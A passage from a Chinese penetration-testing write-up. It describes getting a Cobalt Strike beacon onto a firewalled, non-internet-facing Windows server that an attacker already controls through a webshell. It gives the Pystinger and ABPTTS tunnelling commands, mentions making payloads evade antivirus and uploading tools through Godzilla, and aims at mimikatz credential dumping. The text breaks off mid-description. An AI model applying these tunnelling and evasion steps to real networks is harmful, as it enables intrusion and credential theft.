# 前言
> Authtor: 1frame
本文为一篇利用非常规手段突破安全策略的内网渗透记录
# 环境简述&说明
  * **web打点getshell，webshell是冰蝎，权限为.net，权限很低，服务器为server 2016，目标不出网！**  
  * **装有杀毒软件（火绒、微软自带的WD），ASMI默认开启，而且对power shell有特殊策略限制。**  
  * **Tcp、icmp、DNS协议不通，无法直接与公网的cs服务端建立连接，（内网的cs服务端也无法与其建立连接）公网也无法访问目标web服务（纯内网web服务）**
  * **极其严格的出入站策略**  
入站规则：只有http允许入站，只有一个80、8080两http端口能供内网机器正常访问  
出站规则：不允许非8080端口对外通讯。  
手绘了一张拓扑图，将就着看一下。  
# 为什么要上线cs
**  
webshell权限太低，限制性大，需要上线cs提权，因为cs是采用反射dll来加载pe程序，从而在执行一些敏感操作的时候能起到一定的bypass作用，例如mimikatz抓密码等操作。  
像转储LSA到本地然后再dumphash都是行不通的，因为webshell权限太低了，转储LSA至少得管理员权限。  
而且目标网络环境较为苛刻，任何非http协议的通讯都会被防火墙拦截，无法正常建立一个具有交互功能的shell。**
### 坑点一：利用Pystinger反向代理上线cs
在查阅相关资料后，发现网上大部分文章都通过`Pystinger`来实现内网反向代理，利用http协议将目标机器端口映射至cs服务端监听端口，能在只能访问web服务且不出网的情况下可以使其上线cs。  
**  
但是这里有个问题，公网cs服务器无法访问目标的web服务，只有同处于在一个内网的机器才能访问目标web服务，所以无法直接在服务器上搭建pystinger将目标机端口反向代理至公网cs监听端口上。  
这里采用的解决方法是直接在本机上搭建一个cs服务，然后再进行pystinger反代操作。**  
  1. 本地起一个cs服务  
  2. 常规配置reserver型监听器，监听端口`60020`（上面图中6002少写了个0...）
  3. proxy.aspx上传至目标服务器，访问：  
4.stinger_server.exe 上传到目标服务器，执行命令：
        start D:\stinger_server.exe 0.0.0.0
5.跳板机本地执行命令：
        stinger_client -w http://10.1.1.1:8080/2.aspx-l 0.0.0.0 -p 4002
6.免杀处理一下`resever_bind`，上传至目标并执行不上线，执行一下tasklist发现shell.exe已经执行了，就是不上线，pystinger报错。  
最后的结果是，报错，具体原因不知道，可能是目标web环境有问题，可能是reserver型shell通讯有问题。  
遂Pystinger反代上线cs失败。
### 坑点二：正向代理+正向shell上线公网CS
**  
既然反向代理行不通，那就用正向代理，然后采用正向shell来连接。  
目标机器不出网，本机能出网，可通过本机当作跳板机将目标机器的正向shell带出来。  
原理图：**  
**  
常见的http隧道工具`Neo-reGeorg、reGeorg`（应该这两款用的比较多）能适用于大多数网络环境，但是在这里就是不行，会出现跳板机直接与cs服务器断开的情况，而cs的connect正向连接请求是由跳板机的beacon发出的，你只能将beacon代理进socks隧道才能使connect请求能连接正向shell的监听端口，但因为目标机不出网，在跳板机的beacon进入代理隧道之后是无法连接到处于公网的cs服务端的，所以只能是端口对端口映射，而不能用http协议搭建的socks隧道（我猜的）。**
所以这里将使用`ABPTTS`进行http隧道搭建。
  * **ABPTTS优点  
对抗特征检测十分优秀  
创建的隧道十分稳定**
## 1、 配置abptts：
    python abpttsfactory.py -o server \\生成服务端脚本，初始化。
## 2、 上传server脚本到目标机器
### 坑点三：文件上传
**  
这个地方冰蝎、大马都传文件传不上去，只能用哥斯拉的大文件上传把abptts.aspx传了上去（后面exe的上传也是用的哥斯拉的大文件上传功能）exe文件落地也是个坑，在正常环境中，我们可以用certutil、powershell等方法下载exe到目标上，但是这台机器他不出网，因为出站规则的原因，甚至都无法访问内网中其他机器的web服务器，最后用哥斯拉的大文件上传解决了这个问题。**  
上传完成之后的abptts.aspx地址：  
访问一下abptts.aspx，页面回显一长串密文说明abptts客户端正常  
## 3、 启动http隧道
    Python abpttsclient.py -c server/config.txt -u "http://10.1.1.1:8080/abptts.aspx"-f 127.0.0.1:7777/127.0.0.1:1111
> 这里的127.0.0.1:7777是本机端口，127.0.0.1:1111是目标机的端口  
>  意思是将目标机的1111端口通过http隧道映射至本机的7777端口，你向本地的7777端口发送的请求都将转发至目标机的1111端口。
### 坑点四：正向Bind免杀
## Cs的正向shell介绍（beacon tcp）
**  
正向shell的作用原理是，bind在目标机器上开放一个监听端口，等待其他主机来访问这个监听端口，子Beacon从父Beacon接受请求，而不是直接与cs服务端通讯。  
而反向shell则是，由目标发起请求访问cs服务端的监听端口**
  1. 创建一个正向监听器：  
  2. 生成正向载荷（在生成正向载荷的时候只能选择stageless Beacon ）：  
## 为什么使用正向shell：
**  
假若目标机器的出站规则十分严格且目标也不出网，反向shell在这种情况下则无法正常与cs服务端保持通讯。  
假若采用正向shell的话，在无论他的入站规则多严格，他也不会去阻止本地端口之间的通讯，这样就能绕过严格的出入站规则策略。**
  * 通讯过程：  
**  
Cs服务端（公网）-- > 跳板机（父baecon）--> 7777端口--> 目标8080端口（http隧道）-->